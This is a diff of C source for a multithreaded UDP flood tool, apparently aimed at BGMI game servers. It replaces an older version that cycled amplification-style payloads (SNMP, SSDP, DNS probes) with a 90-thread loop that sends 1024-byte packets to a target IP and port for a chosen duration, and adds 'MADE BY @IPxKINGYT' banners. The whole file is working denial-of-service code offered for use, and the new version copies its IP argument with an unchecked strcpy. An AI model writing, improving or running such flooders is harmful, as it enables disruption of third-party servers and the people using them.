@@ -1,67 +1,45 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <pthread.h>
 #include <unistd.h>
 #include <arpa/inet.h>
-#include <pthread.h>
 #include <time.h>
 
-void usage() {
-    printf("Usage: ./bgmi ip port time threads\n");
-    exit(1);
-}
+#define MAX_THREADS 90
+#define PAYLOAD_SIZE 1024  // Payload size in bytes
 
-struct thread_data {
-    char *ip;
+typedef struct {
+    char ip[16];
     int port;
-    int time;
-};
+    int duration;
+} AttackParams;
 
-void *attack(void *arg) {
-    struct thread_data *data = (struct thread_data *)arg;
+void* send_payload(void* arg) {
+    AttackParams* params = (AttackParams*)arg;
     int sock;
     struct sockaddr_in server_addr;
-    time_t endtime;
+    char payload[PAYLOAD_SIZE];
 
-    char *payloads[] = {
-        "\xd9\x00", "\x00\x00", "\x00\x00", "\x00\x00", "\x00\x00", 
-        "\x00\x00", "\xd9\x00\x00", "\xd9\x00\x00", "\xd9\x00\x00", "\xd9\x00\x00", 
-        "\xd9\x00\x00", "\xd9\x00\x00", "\x72\xfe\x1d\x13\x00\x00", 
-        "\x72\xfe\x1d\x13\x00\x00", "\x72\xfe\x1d\x13\x00\x00", 
-        "\x72\xfe\x1d\x13\x00\x00", "\x72\xfe\x1d\x13\x00\x00", 
-        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
-        "\x02\x00\x00", "\x0d\x0a\x0d\x0a\x00\x00", 
-        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00", 
-        "\x72\xfe\x1d\x13\x00\x00", "\x38\x64\xc1\x78\x01\xb8\x9b\xcb\x8f\x00\x00", 
-        "\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00",
-        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00", 
-        "\x01\x00\x00", "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
-        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
-        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00", 
-        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00", 
-        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
-    };
+    // Create a large payload to simulate high ping
+    memset(payload, 'A', PAYLOAD_SIZE - 1);
+    payload[PAYLOAD_SIZE - 1] = '\0';
 
-    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+    sock = socket(AF_INET, SOCK_DGRAM, 0); // UDP socket
+    if (sock < 0) {
         perror("Socket creation failed");
         pthread_exit(NULL);
     }
 
-    memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(data->port);
-    server_addr.sin_addr.s_addr = inet_addr(data->ip);
+    server_addr.sin_port = htons(params->port);
+    server_addr.sin_addr.s_addr = inet_addr(params->ip);
 
-    endtime = time(NULL) + data->time;
-
-    while (time(NULL) <= endtime) {
-        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
-            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
-                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-                perror("Send failed");
-                close(sock);
-                pthread_exit(NULL);
-            }
+    time_t start_time = time(NULL);
+    while (time(NULL) - start_time < params->duration) {
+        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+            perror("Send failed");
+            break;
         }
     }
 
@@ -69,42 +47,34 @@ void *attack(void *arg) {
     pthread_exit(NULL);
 }
 
-int main(int argc, char *argv[]) {
-    if (argc != 5) {
-        usage();
+int main(int argc, char* argv[]) {
+    if (argc != 4) {
+        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
+        return 1;
     }
 
-    char *ip = argv[1];
-    int port = atoi(argv[2]);
-    int time = atoi(argv[3]);
-    int threads = atoi(argv[4]);
+    AttackParams params;
+    strcpy(params.ip, argv[1]);
+    params.port = atoi(argv[2]);
+    params.duration = atoi(argv[3]);
 
-    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
+    pthread_t threads[MAX_THREADS];
 
-    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);
+    printf("MADE BY @IPxKINGYT %s:%d for %d seconds with %d threads...\n",
+           params.ip, params.port, params.duration, MAX_THREADS);
 
-    for (int i = 0; i < threads; i++) {
-
-        struct thread_data *data = malloc(sizeof(struct thread_data));
-        data->ip = ip;
-        data->port = port;
-        data->time = time;
-
-
-        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
+    for (int i = 0; i < MAX_THREADS; i++) {
+        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
             perror("Thread creation failed");
-            free(data);
-            free(thread_ids);
-            exit(1);
         }
-        printf("Launched thread with ID: %lu\n", thread_ids[i]);
     }
 
-    for (int i = 0; i < threads; i++) {
-        pthread_join(thread_ids[i], NULL);
+    for (int i = 0; i < MAX_THREADS; i++) {
+        pthread_join(threads[i], NULL);
     }
 
-    free(thread_ids);
-    printf("Attack finished\n");
+    printf("FUCKED ATTACK @IPxKINGYT HOST IP %s on port %d for %d seconds\n",
+           params.ip, params.port, params.duration);
+
     return 0;
 }
